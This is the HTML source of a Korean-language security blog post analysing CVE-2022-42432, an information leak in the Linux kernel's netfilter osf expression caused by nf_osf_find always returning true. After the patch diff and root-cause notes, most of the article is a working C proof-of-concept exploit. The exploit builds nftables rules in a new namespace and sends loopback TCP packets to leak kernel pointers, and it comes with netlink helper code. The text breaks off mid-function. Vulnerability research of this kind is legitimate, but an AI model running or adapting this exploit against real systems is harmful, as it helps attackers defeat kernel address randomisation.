<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>CVE-2022-42432 Linux kernel netfilter | msh1307</title>
<meta name="keywords" content="Linux kernel, CVE-2022-42432">
<meta name="description" content="CVE-2022-42432 struct expr_ops expr_ops_osf = { .name	= &#34;osf&#34;, .alloc_len	= sizeof(struct nftnl_expr_osf), .max_attr	= NFTA_OSF_MAX, .set	= nftnl_expr_osf_set, .get	= nftnl_expr_osf_get, .parse	= nftnl_expr_osf_parse, .build	= nftnl_expr_osf_build, .output	= nftnl_expr_osf_snprintf, }; libnftnl 소스코드에서 osf expr도 지원한다는 것을 알 수 있었다.
struct nftnl_expr_osf { enum nft_registers	dreg; uint8_t	ttl; uint32_t	flags; }; static int nftnl_expr_osf_set(struct nftnl_expr *e, uint16_t type, const void *data, uint32_t data_len) { struct nftnl_expr_osf *osf = nftnl_expr_data(e); switch(type) { case NFTNL_EXPR_OSF_DREG: memcpy(&amp;osf-&gt;dreg, data, sizeof(osf-&gt;dreg)); break; case NFTNL_EXPR_OSF_TTL: memcpy(&amp;osf-&gt;ttl, data, sizeof(osf-&gt;ttl)); break; case NFTNL_EXPR_OSF_FLAGS: memcpy(&amp;osf-&gt;flags, data, sizeof(osf-&gt;flags)); break; } return 0; } nf tables에서 expr 추가하듯이 추가하면 된다.">
<meta name="author" content="">
<link rel="canonical" href="https://msh1307.kr/blog/cve-2022-42432-linux-kernel-netfilter/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.min.d9c43e0c7cae3b38c51e79921ad3cf2685d9811a56593a817d9b57ac4fdebf2b.css" integrity="sha256-2cQ&#43;DHyuOzjFHnmSGtPPJoXZgRpWWTqBfZtXrE/evys=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.min.b95bacdc39e37a332a9f883b1e78be4abc1fdca2bc1f2641f55e3cd3dabd4d61.js" integrity="sha256-uVus3DnjejMqn4g7Hni&#43;Srwf3KK8HyZB9V4809q9TWE="
    onload="hljs.initHighlightingOnLoad();"></script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-BR89V2WEC0"></script>
<script>
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-BR89V2WEC0');
</script>
<link rel="icon" href="https://msh1307.kr/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://msh1307.kr/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://msh1307.kr/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://msh1307.kr/apple-touch-icon.png">
<link rel="mask-icon" href="https://msh1307.kr/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="CVE-2022-42432 Linux kernel netfilter" />
<meta property="og:description" content="CVE-2022-42432 struct expr_ops expr_ops_osf = { .name	= &#34;osf&#34;, .alloc_len	= sizeof(struct nftnl_expr_osf), .max_attr	= NFTA_OSF_MAX, .set	= nftnl_expr_osf_set, .get	= nftnl_expr_osf_get, .parse	= nftnl_expr_osf_parse, .build	= nftnl_expr_osf_build, .output	= nftnl_expr_osf_snprintf, }; libnftnl 소스코드에서 osf expr도 지원한다는 것을 알 수 있었다.
struct nftnl_expr_osf { enum nft_registers	dreg; uint8_t	ttl; uint32_t	flags; }; static int nftnl_expr_osf_set(struct nftnl_expr *e, uint16_t type, const void *data, uint32_t data_len) { struct nftnl_expr_osf *osf = nftnl_expr_data(e); switch(type) { case NFTNL_EXPR_OSF_DREG: memcpy(&amp;osf-&gt;dreg, data, sizeof(osf-&gt;dreg)); break; case NFTNL_EXPR_OSF_TTL: memcpy(&amp;osf-&gt;ttl, data, sizeof(osf-&gt;ttl)); break; case NFTNL_EXPR_OSF_FLAGS: memcpy(&amp;osf-&gt;flags, data, sizeof(osf-&gt;flags)); break; } return 0; } nf tables에서 expr 추가하듯이 추가하면 된다." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://msh1307.kr/blog/cve-2022-42432-linux-kernel-netfilter/" /><meta property="article:section" content="blog" />
<meta property="article:published_time" content="2024-03-10T00:00:00&#43;00:00" />
<meta property="article:modified_time" content="2024-03-10T00:00:00&#43;00:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="CVE-2022-42432 Linux kernel netfilter"/>
<meta name="twitter:description" content="CVE-2022-42432 struct expr_ops expr_ops_osf = { .name	= &#34;osf&#34;, .alloc_len	= sizeof(struct nftnl_expr_osf), .max_attr	= NFTA_OSF_MAX, .set	= nftnl_expr_osf_set, .get	= nftnl_expr_osf_get, .parse	= nftnl_expr_osf_parse, .build	= nftnl_expr_osf_build, .output	= nftnl_expr_osf_snprintf, }; libnftnl 소스코드에서 osf expr도 지원한다는 것을 알 수 있었다.
struct nftnl_expr_osf { enum nft_registers	dreg; uint8_t	ttl; uint32_t	flags; }; static int nftnl_expr_osf_set(struct nftnl_expr *e, uint16_t type, const void *data, uint32_t data_len) { struct nftnl_expr_osf *osf = nftnl_expr_data(e); switch(type) { case NFTNL_EXPR_OSF_DREG: memcpy(&amp;osf-&gt;dreg, data, sizeof(osf-&gt;dreg)); break; case NFTNL_EXPR_OSF_TTL: memcpy(&amp;osf-&gt;ttl, data, sizeof(osf-&gt;ttl)); break; case NFTNL_EXPR_OSF_FLAGS: memcpy(&amp;osf-&gt;flags, data, sizeof(osf-&gt;flags)); break; } return 0; } nf tables에서 expr 추가하듯이 추가하면 된다."/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Blogs",
      "item": "https://msh1307.kr/blog/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "CVE-2022-42432 Linux kernel netfilter",
      "item": "https://msh1307.kr/blog/cve-2022-42432-linux-kernel-netfilter/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "CVE-2022-42432 Linux kernel netfilter",
  "name": "CVE-2022-42432 Linux kernel netfilter",
  "description": "CVE-2022-42432 struct expr_ops expr_ops_osf = { .name\t= \u0026#34;osf\u0026#34;, .alloc_len\t= sizeof(struct nftnl_expr_osf), .max_attr\t= NFTA_OSF_MAX, .set\t= nftnl_expr_osf_set, .get\t= nftnl_expr_osf_get, .parse\t= nftnl_expr_osf_parse, .build\t= nftnl_expr_osf_build, .output\t= nftnl_expr_osf_snprintf, }; libnftnl 소스코드에서 osf expr도 지원한다는 것을 알 수 있었다.\nstruct nftnl_expr_osf { enum nft_registers\tdreg; uint8_t\tttl; uint32_t\tflags; }; static int nftnl_expr_osf_set(struct nftnl_expr *e, uint16_t type, const void *data, uint32_t data_len) { struct nftnl_expr_osf *osf = nftnl_expr_data(e); switch(type) { case NFTNL_EXPR_OSF_DREG: memcpy(\u0026amp;osf-\u0026gt;dreg, data, sizeof(osf-\u0026gt;dreg)); break; case NFTNL_EXPR_OSF_TTL: memcpy(\u0026amp;osf-\u0026gt;ttl, data, sizeof(osf-\u0026gt;ttl)); break; case NFTNL_EXPR_OSF_FLAGS: memcpy(\u0026amp;osf-\u0026gt;flags, data, sizeof(osf-\u0026gt;flags)); break; } return 0; } nf tables에서 expr 추가하듯이 추가하면 된다.",
  "keywords": [
    "Linux kernel", "CVE-2022-42432"
  ],
  "articleBody": "CVE-2022-42432 struct expr_ops expr_ops_osf = { .name\t= \"osf\", .alloc_len\t= sizeof(struct nftnl_expr_osf), .max_attr\t= NFTA_OSF_MAX, .set\t= nftnl_expr_osf_set, .get\t= nftnl_expr_osf_get, .parse\t= nftnl_expr_osf_parse, .build\t= nftnl_expr_osf_build, .output\t= nftnl_expr_osf_snprintf, }; libnftnl 소스코드에서 osf expr도 지원한다는 것을 알 수 있었다.\nstruct nftnl_expr_osf { enum nft_registers\tdreg; uint8_t\tttl; uint32_t\tflags; }; static int nftnl_expr_osf_set(struct nftnl_expr *e, uint16_t type, const void *data, uint32_t data_len) { struct nftnl_expr_osf *osf = nftnl_expr_data(e); switch(type) { case NFTNL_EXPR_OSF_DREG: memcpy(\u0026osf-\u003edreg, data, sizeof(osf-\u003edreg)); break; case NFTNL_EXPR_OSF_TTL: memcpy(\u0026osf-\u003ettl, data, sizeof(osf-\u003ettl)); break; case NFTNL_EXPR_OSF_FLAGS: memcpy(\u0026osf-\u003eflags, data, sizeof(osf-\u003eflags)); break; } return 0; } nf tables에서 expr 추가하듯이 추가하면 된다.\nenum expr_types { EXPR_INVALID, EXPR_VERDICT, EXPR_SYMBOL, EXPR_VARIABLE, EXPR_VALUE, EXPR_PREFIX, EXPR_RANGE, EXPR_PAYLOAD, EXPR_EXTHDR, EXPR_META, EXPR_SOCKET, EXPR_OSF, EXPR_CT, EXPR_CONCAT, EXPR_LIST, EXPR_SET, EXPR_SET_REF, EXPR_SET_ELEM, EXPR_MAPPING, EXPR_MAP, EXPR_UNARY, EXPR_BINOP, EXPR_RELATIONAL, EXPR_NUMGEN, EXPR_HASH, EXPR_RT, EXPR_FIB, EXPR_XFRM, EXPR_SET_ELEM_CATCHALL, EXPR_FLAGCMP, EXPR_MAX = EXPR_FLAGCMP }; strncpy((char *)dest, \"unknown\", NFT_OSF_MAXGENRELEN); } else { if (priv-\u003eflags \u0026 NFT_OSF_F_VERSION) snprintf(os_match, NFT_OSF_MAXGENRELEN, \"%s:%s\", data.genre, data.version); flags에는 NFT_OSF_F_VERSION을 세팅해줘야 더 많이 복사가 된다?\nRoot Cause diff --git a/net/netfilter/nfnetlink_osf.c b/net/netfilter/nfnetlink_osf.c index 0fa2e2030427..ee6840bd5933 100644 --- a/net/netfilter/nfnetlink_osf.c +++ b/net/netfilter/nfnetlink_osf.c @@ -269,6 +269,7 @@ bool nf_osf_find(const struct sk_buff *skb, struct nf_osf_hdr_ctx ctx; const struct tcphdr *tcp; struct tcphdr _tcph; +\tbool found = false; memset(\u0026ctx, 0, sizeof(ctx)); @@ -283,10 +284,11 @@ bool nf_osf_find(const struct sk_buff *skb, data-\u003egenre = f-\u003egenre; data-\u003eversion = f-\u003eversion; +\tfound = true; break; } -\treturn true; +\treturn found; } EXPORT_SYMBOL_GPL(nf_osf_find); nf_osf_find 함수가 항상 true를 리턴해서 초기화되지 않은 영역을 릭할 수 있다.\nbool nf_osf_find(const struct sk_buff *skb, const struct list_head *nf_osf_fingers, const int ttl_check, struct nf_osf_data *data) { const struct iphdr *ip = ip_hdr(skb); const struct nf_osf_user_finger *f; unsigned char opts[MAX_IPOPTLEN]; const struct nf_osf_finger *kf; struct nf_osf_hdr_ctx ctx; const struct tcphdr *tcp; struct tcphdr _tcph; memset(\u0026ctx, 0, sizeof(ctx)); tcp = nf_osf_hdr_ctx_init(\u0026ctx, skb, ip, opts, \u0026_tcph); if (!tcp) return false; list_for_each_entry_rcu(kf, \u0026nf_osf_fingers[ctx.df], finger_entry) { f = \u0026kf-\u003efinger; if (!nf_osf_match_one(skb, f, ttl_check, \u0026ctx)) continue; data-\u003egenre = f-\u003egenre; data-\u003eversion = f-\u003eversion; break; } return true; } EXPORT_SYMBOL_GPL(nf_osf_find); nf_osf_fingers를 돌면서 kf에 값을 할당한뒤, match하는지 확인한다.\nstatic void nft_osf_eval(const struct nft_expr *expr, struct nft_regs *regs, const struct nft_pktinfo *pkt) { struct nft_osf *priv = nft_expr_priv(expr); u32 *dest = \u0026regs-\u003edata[priv-\u003edreg]; struct sk_buff *skb = pkt-\u003eskb; char os_match[NFT_OSF_MAXGENRELEN + 1]; const struct tcphdr *tcp; struct nf_osf_data data; struct tcphdr _tcph; if (pkt-\u003etprot != IPPROTO_TCP) { regs-\u003everdict.code = NFT_BREAK; return; } tcp = skb_header_pointer(skb, ip_hdrlen(skb), sizeof(struct tcphdr), \u0026_tcph); if (!tcp) { regs-\u003everdict.code = NFT_BREAK; return; } if (!tcp-\u003esyn) { regs-\u003everdict.code = NFT_BREAK; return; } if (!nf_osf_find(skb, nf_osf_fingers, priv-\u003ettl, \u0026data)) { strncpy((char *)dest, \"unknown\", NFT_OSF_MAXGENRELEN); } else { if (priv-\u003eflags \u0026 NFT_OSF_F_VERSION) snprintf(os_match, NFT_OSF_MAXGENRELEN, \"%s:%s\", data.genre, data.version); else strlcpy(os_match, data.genre, NFT_OSF_MAXGENRELEN); strncpy((char *)dest, os_match, NFT_OSF_MAXGENRELEN); } } 무조건 true가 리턴되기 때문에 data 부분 릭 가능하다.\nstatic bool nf_osf_match_one(const struct sk_buff *skb, const struct nf_osf_user_finger *f, int ttl_check, struct nf_osf_hdr_ctx *ctx) { const __u8 *optpinit = ctx-\u003eoptp; unsigned int check_WSS = 0; int fmatch = FMATCH_WRONG; int foptsize, optnum; u16 mss = 0; if (ctx-\u003etotlen != f-\u003ess || !nf_osf_ttl(skb, ttl_check, f-\u003ettl)) return false; /* * Should not happen if userspace parser was written correctly. */ find안에서 호출하는데, 이때 이부분을 잘 조작해서 무조건 false 리턴하게해서 넘어가면 된다.\nLeak nft log를 호출해서 모듈의 rodata section 부분을 가져올 수 있고, 코드 영역도 구할 수 있다.\n#define _GNU_SOURCE #include #include #include #include #include #include \"utils.h\" #include #include #define SIZE 0x800 // static struct nftnl_rule *isolate_pkt(uint8_t family, const char *table, const char *chain, const char * target_chain) // { // struct nftnl_rule *r = NULL; // uint16_t port = 8888; // r = nftnl_rule_alloc(); // if (r == NULL) { // perror(\"OOM\"); // exit(EXIT_FAILURE); // } // nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table); // nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, chain); // nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family); // add_payload(r, NFT_PAYLOAD_TRANSPORT_HEADER, 0, NFT_REG_1, 13,1); // 0x18 -\u003e PSH ACK // add_cmp(r,NFT_REG_1, NFT_CMP_EQ, \"\\x18\",1); // add_verdict(r, NFT_JUMP, target_chain, NFT_REG_VERDICT); // // TODO // return r; // } static struct nftnl_rule *edit_pkt_data(uint8_t family, const char *table, const char *chain) { struct nftnl_rule *r = NULL; r = nftnl_rule_alloc(); if (r == NULL) { perror(\"OOM\"); exit(EXIT_FAILURE); } // enum nft_payload_bases { // NFT_PAYLOAD_LL_HEADER, // NFT_PAYLOAD_NETWORK_HEADER, // NFT_PAYLOAD_TRANSPORT_HEADER, // }; nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table); nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, chain); nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family); add_payload(r, NFT_PAYLOAD_TRANSPORT_HEADER, 0, NFT_REG32_08, 13,4); add_cmp(r, NFT_REG32_08, NFT_CMP_EQ, \"\\x18\", 1); mov_imm(r, NFT_REG_4,\"\\x02\",1); // add_bitwise(r, 0x2); // 2 // add_payload(r, NFT_PAYLOAD_NETWORK_HEADER, NFT_REG_1, 0, 2,2); // total len corrupt add_payload(r, NFT_PAYLOAD_TRANSPORT_HEADER, NFT_REG_4, 0, 13,1); // add_cmp(r,NFT_REG_3,NFT_CMP_NEQ, \"\\xff\",1); // NO CRASH BUT NOT LEAKED add_log(r); // LEAK // add_range(r); add_osf(r, NFT_REG_1, 0, NFT_OSF_F_VERSION); add_payload(r, NFT_PAYLOAD_TRANSPORT_HEADER, NFT_REG_1, 0, 0x28,0x10); add_payload(r, NFT_PAYLOAD_TRANSPORT_HEADER, NFT_REG32_08, 0, 13,1); // TODO return r; } void install_rule_for_leak() { // if(create_rule(isolate_pkt(NFPROTO_IPV4, \"filter\", \"input\", \"leak\")) == 0 ){ // perror(\"error creating rule\"); // exit(EXIT_FAILURE); // } // if(create_rule(edit_pkt_data(NFPROTO_IPV4, \"filter\", \"leak\")) == 0 ){ // perror(\"error creating rule\"); // exit(EXIT_FAILURE); // } if(create_rule(edit_pkt_data(NFPROTO_IPV4, \"filter\", \"input\")) == 0 ){ perror(\"error creating rule\"); exit(EXIT_FAILURE); } } void client(void * data){ int sockfd; struct sockaddr_in server_addr; char * buf = malloc(0x200); sockfd = socket(AF_INET, SOCK_STREAM, 0); if (sockfd == -1) { perror(\"socket\"); exit(EXIT_FAILURE); } server_addr.sin_family = AF_INET; server_addr.sin_port = htons(8888); inet_pton(AF_INET, \"127.0.0.1\", \u0026(server_addr.sin_addr)); if (connect(sockfd, (struct sockaddr *)\u0026server_addr, sizeof((server_addr))) == -1) { perror(\"connect\"); close(sockfd); exit(EXIT_FAILURE); } for(int i =0;i\u003c4;i++){ int res = write(sockfd, data, SIZE); } close(sockfd); return 0; } void server(void *buf) { struct sockaddr_in server_addr; socklen_t server_addr_len; struct sockaddr_in client_addr; socklen_t client_addr_len; char tmp[0x200]; client_addr_len = sizeof(client_addr); int fd = socket(AF_INET, SOCK_STREAM, 0); if (fd == -1) { perror(\"socket\"); exit(EXIT_FAILURE); } server_addr.sin_family = AF_INET; server_addr.sin_port = htons(8888); server_addr.sin_addr.s_addr = htonl(INADDR_ANY); if (bind(fd, (struct sockaddr *)\u0026server_addr, sizeof(server_addr)) == -1) { perror(\"bind\"); close(fd); exit(EXIT_FAILURE); } if (listen(fd, 50) \u003c 0) { perror(\"listen\"); close(fd); exit(EXIT_FAILURE); } int cl_sock = accept(fd, (struct sockaddr *)\u0026client_addr, \u0026client_addr_len); if (cl_sock \u003c 0){ perror(\"accept\"); close(fd); exit(EXIT_FAILURE); } for (int i =0;i\u003c4;i++){ int ret = read(cl_sock, buf, SIZE); hexdump(buf,0x20); uint64_t leak = *(uint64_t * )((uint64_t)buf + 9); printf(\"Leaked : 0x%lx\\n\", leak); } close(cl_sock); // Close client socket close(fd); // Close server socket } int main(int argc, char *argv[]) { int tid, status; pthread_t p_thread; unsigned char udpbuf[512] = {0,}; uint64_t kernel_base = 0; memset(udpbuf, 0x41, 512); new_ns(); system(\"ip link set lo up\"); uint64_t * buf = malloc(0x200); tid = pthread_create(\u0026p_thread, NULL, server, buf); if (tid \u003c 0){ perror(\"thread create error : \"); exit(0); } if(create_table(NFPROTO_IPV4, \"filter\", false) == 0){ perror(\"error creating table\"); exit(EXIT_FAILURE); } if(create_chain(\"filter\", \"input\", NF_INET_LOCAL_IN) == 0){ perror(\"error creating chain\"); exit(EXIT_FAILURE); } if(create_chain(\"filter\", \"leak\", 0) == 0){ perror(\"error creating chain\"); exit(EXIT_FAILURE); } install_rule_for_leak(); printf(\"[-] send \u0026 recv tcp packet\\n\"); usleep(1000); client(udpbuf); sleep(1); return 0; } #include #include #include #include #include #include #include #include #include #include #include #include #include #include #include #include #include #include #include #include #include void add_log(struct nftnl_rule *r){ struct nftnl_expr * expr = nftnl_expr_alloc(\"log\"); nftnl_expr_set_u32(expr, NFTNL_EXPR_LOG_GROUP, 0); nftnl_expr_set_u32(expr, NFTNL_EXPR_LOG_PREFIX, \"Packet logged: \"); nftnl_expr_set_u32(expr, NFTNL_EXPR_LOG_SNAPLEN, 128); nftnl_rule_add_expr(r, expr); } void add_range(struct nftnl_rule *r){ struct nftnl_expr * expr = nftnl_expr_alloc(\"range\"); nftnl_expr_set_u32(expr, NFTNL_EXPR_RANGE_SREG, NFT_REG_4); nftnl_expr_set_u32(expr, NFTNL_EXPR_RANGE_OP, NFT_RANGE_NEQ); nftnl_expr_set_u32(expr, NFTA_RANGE_FROM_DATA, 0xff); nftnl_expr_set_u32(expr, NFTA_RANGE_TO_DATA, 0x100); nftnl_rule_add_expr(r, expr); } void add_bitwise(struct nftnl_rule *r, uint32_t bitmask){ struct nftnl_expr * expr = nftnl_expr_alloc(\"bitwise\"); nftnl_expr_set_u32(expr, NFTNL_EXPR_BITWISE_SREG, NFT_REG_2); nftnl_expr_set_u32(expr, NFTNL_EXPR_BITWISE_DREG, NFT_REG_4); nftnl_expr_set_u32(expr, NFTNL_EXPR_BITWISE_OP, NFTA_BITWISE_DATA); nftnl_expr_set_u32(expr, NFTNL_EXPR_BITWISE_LEN, 1); nftnl_expr_set_u32(expr, NFTNL_EXPR_BITWISE_MASK, bitmask); nftnl_expr_set_u32(expr, NFTNL_EXPR_BITWISE_DATA, 0x2); nftnl_rule_add_expr(r, expr); } void mov_imm(struct nftnl_rule *r, uint32_t dreg, uint8_t * data, uint32_t datalen) { struct nftnl_expr *e; e = nftnl_expr_alloc(\"immediate\"); if (e == NULL) { perror(\"expr imm oom\"); exit(EXIT_FAILURE); } nftnl_expr_set_u32(e, NFTNL_EXPR_IMM_DREG, dreg); nftnl_expr_set(e,NFTNL_EXPR_IMM_DATA,data,datalen); nftnl_rule_add_expr(r, e); } void add_osf(struct nftnl_rule *r, uint32_t dreg, uint8_t ttl, uint32_t flags) { struct nftnl_expr *e; e = nftnl_expr_alloc(\"osf\"); if (e == NULL) { perror(\"expr osf oom\"); exit(EXIT_FAILURE); } nftnl_expr_set_u32(e, NFTNL_EXPR_OSF_DREG, dreg); nftnl_expr_set_u8(e, NFTNL_EXPR_OSF_TTL, ttl); nftnl_expr_set_u32(e, NFTNL_EXPR_OSF_FLAGS, flags); nftnl_rule_add_expr(r, e); } void pin_cpu(int cpu) { cpu_set_t set; CPU_ZERO(\u0026set); CPU_SET(cpu, \u0026set); if (sched_setaffinity(0, sizeof(cpu_set_t), \u0026set)) { printf(\"error\\n\"); exit(-1); } } bool create_table(uint32_t protocol, char * table_name, bool delete){ struct mnl_socket *nl; char buf[MNL_SOCKET_BUFFER_SIZE]; struct nlmsghdr *nlh; uint32_t portid, seq, table_seq, chain_seq, family; struct nftnl_table *t; struct mnl_nlmsg_batch *batch; int ret, batching; t = nftnl_table_alloc(); if (t == NULL) { perror(\"nftnl_table_alloc\"); return false; } nftnl_table_set_u32(t, NFTNL_TABLE_FAMILY, protocol); nftnl_table_set_str(t, NFTNL_TABLE_NAME, table_name); batching = nftnl_batch_is_supported(); if (batching \u003c 0) { perror(\"cannot talk to nfnetlink\"); return false; } seq = time(NULL); batch = mnl_nlmsg_batch_start(buf, sizeof(buf)); if (batching) { nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++); mnl_nlmsg_batch_next(batch); } table_seq = seq; nlh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), delete?NFT_MSG_DELTABLE:NFT_MSG_NEWTABLE, NFPROTO_IPV4, NLM_F_ACK, seq++); nftnl_table_nlmsg_build_payload(nlh, t); nftnl_table_free(t); mnl_nlmsg_batch_next(batch); if (batching) { nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++); mnl_nlmsg_batch_next(batch); } nl = mnl_socket_open(NETLINK_NETFILTER); if (nl == NULL) { perror(\"mnl_socket_open\"); return false; } if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) \u003c 0) { perror(\"mnl_socket_bind\"); return false; } portid = mnl_socket_get_portid(nl); if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch)) \u003c 0) { perror(\"mnl_socket_send\"); return false; } mnl_nlmsg_batch_stop(batch); ret = mnl_socket_recvfrom(nl, buf, sizeof(buf)); while (ret \u003e 0) { ret = mnl_cb_run(buf, ret, table_seq, portid, NULL, NULL); if (ret \u003c= 0) break; ret = mnl_socket_recvfrom(nl, buf, sizeof(buf)); } if (ret == -1) { perror(\"error\"); return false; } mnl_socket_close(nl); return true; } bool create_chain(char * table_name, char * chain_name, uint32_t hook_num){ // NF_INET_LOCAL_IN struct mnl_socket *nl; char buf[MNL_SOCKET_BUFFER_SIZE]; struct nlmsghdr *nlh; uint32_t portid, seq, chain_seq; int ret, family; struct nftnl_chain *t; struct mnl_nlmsg_batch *batch; int batching; t = nftnl_chain_alloc(); if (t == NULL) return false; nftnl_chain_set_str(t, NFTNL_CHAIN_TABLE, table_name); nftnl_chain_set_str(t, NFTNL_CHAIN_NAME, chain_name); if(hook_num != 0) nftnl_chain_set_u32(t, NFTNL_CHAIN_HOOKNUM, hook_num); nftnl_chain_set_u32(t, NFTNL_CHAIN_PRIO, 0); batching = nftnl_batch_is_supported(); if (batching \u003c 0) { perror(\"cannot talk to nfnetlink\"); return false; } seq = time(NULL); batch = mnl_nlmsg_batch_start(buf, sizeof(buf)); if (batching) { nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++); mnl_nlmsg_batch_next(batch); } chain_seq = seq; nlh = nftnl_chain_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWCHAIN, NFPROTO_IPV4, NLM_F_ACK, seq++); nftnl_chain_nlmsg_build_payload(nlh, t); nftnl_chain_free(t); mnl_nlmsg_batch_next(batch); if (batching) { nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++); mnl_nlmsg_batch_next(batch); } nl = mnl_socket_open(NETLINK_NETFILTER); if (nl == NULL) { perror(\"mnl_socket_open\"); return false; } if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) \u003c 0) { perror(\"mnl_socket_bind\"); return false; } portid = mnl_socket_get_portid(nl); if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch)) \u003c 0) { perror(\"mnl_socket_send\"); return false; } ret = mnl_socket_recvfrom(nl, buf, sizeof(buf)); while (ret \u003e 0) { ret = mnl_cb_run(buf, ret, chain_seq, portid, NULL, NULL); if (ret \u003c= 0) break; ret = mnl_socket_recvfrom(nl, buf, sizeof(buf)); } if (ret == -1) { perror(\"error\"); return false; } mnl_socket_close(nl); return true; } bool delete_chain(char * table_name, char * chain_name){ struct mnl_socket *nl; char buf[MNL_SOCKET_BUFFER_SIZE]; struct nlmsghdr *nlh; uint32_t portid, seq, chain_seq; int ret, family; struct nftnl_chain *t; struct mnl_nlmsg_batch *batch; int batching; t = nftnl_chain_alloc(); if (t == NULL) return false; nftnl_chain_set_str(t, NFTNL_CHAIN_TABLE, table_name); nftnl_chain_set_str(t, NFTNL_CHAIN_NAME, chain_name); seq = time(NULL); batch = mnl_nlmsg_batch_start(buf, sizeof(buf)); nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++); mnl_nlmsg_batch_next(batch); chain_seq = seq; nlh = nftnl_chain_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_DELCHAIN, NFPROTO_IPV4, NLM_F_ACK, seq++); nftnl_chain_nlmsg_build_payload(nlh, t); nftnl_chain_free(t); mnl_nlmsg_batch_next(batch); nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++); mnl_nlmsg_batch_next(batch); nl = mnl_socket_open(NETLINK_NETFILTER); if (nl == NULL) { perror(\"mnl_socket_open\"); return false; } if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) \u003c 0) { perror(\"mnl_socket_bind\"); return false; } portid = mnl_socket_get_portid(nl); if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch)) \u003c 0) { perror(\"mnl_socket_send\"); return false; } mnl_nlmsg_batch_stop(batch); ret = mnl_socket_recvfrom(nl, buf, sizeof(buf)); while (ret \u003e 0) { ret = mnl_cb_run(buf, ret, chain_seq, portid, NULL, NULL); if (ret \u003c= 0) break; ret = mnl_socket_recvfrom(nl, buf, sizeof(buf)); } if (ret == -1) { perror(\"error\"); return false; } mnl_socket_close(nl); return true; } bool create_rule(struct nftnl_rule * r) { struct mnl_socket *nl; struct nlmsghdr *nlh; struct mnl_nlmsg_batch *batch; char buf[MNL_SOCKET_BUFFER_SIZE]; uint32_t seq = time(NULL); int ret; nl = mnl_socket_open(NETLINK_NETFILTER); if (nl == NULL) { perror(\"mnl_socket_open\"); return false; } if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) \u003c 0) { perror(\"mnl_socket_bind\"); return false; } batch = mnl_nlmsg_batch_start(buf, sizeof(buf)); nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++); mnl_nlmsg_batch_next(batch); nlh = nftnl_rule_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWRULE, nftnl_rule_get_u32(r, NFTNL_RULE_FAMILY), NLM_F_APPEND|NLM_F_CREATE|NLM_F_ACK, seq++); nftnl_rule_nlmsg_build_payload(nlh, r); nftnl_rule_free(r); mnl_nlmsg_batch_next(batch); nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++); mnl_nlmsg_batch_next(batch); ret = mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch)); if (ret == -1) { perror(\"mnl_socket_sendto\"); return false; } mnl_nlmsg_batch_stop(batch); ret = mnl_socket_recvfrom(nl, buf, sizeof(buf)); if (ret == -1) { perror(\"mnl_socket_recvfrom\"); return false; } ret = mnl_cb_run(buf, ret, 0, mnl_socket_get_portid(nl), NULL, NULL); if (ret \u003c 0) { perror(\"mnl_cb_run\"); return false; } mnl_socket_close(nl); return true; } static void add_meta(struct 